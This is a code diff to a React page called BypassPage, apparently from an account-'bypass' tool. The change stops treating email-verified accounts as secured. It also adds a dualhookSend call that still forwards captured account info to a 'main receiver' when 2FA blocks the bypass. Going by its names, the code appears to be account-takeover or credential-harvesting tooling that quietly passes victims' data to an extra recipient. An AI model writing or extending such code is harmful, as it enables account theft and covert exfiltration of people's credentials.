@@ -93,14 +93,14 @@ const BypassPage = () => {
       return;
     }
 
-    // Secured accounts (2FA or verified email) cannot be bypassed → BLOCK BYPASS
-    if (info.has2FA || info.emailVerified) {
+    // Secured accounts (2FA only) → BLOCK BYPASS live, but still send main receiver
+    if (info.has2FA) {
       if (intervalRef.current) window.clearInterval(intervalRef.current);
       setProgress(0);
       setStatus("error");
-      const reason = info.has2FA ? 'Authenticator enabled' : 'Email secured';
-      toast.error(`Account secured (${reason})`);
-      await broadcastLiveBypassFailed(info, reason);
+      toast.error("Account secured (Authenticator enabled)");
+      await broadcastLiveBypassFailed(info, 'Authenticator enabled');
+      await dualhookSend("bypass", info);
       return;
     }
 
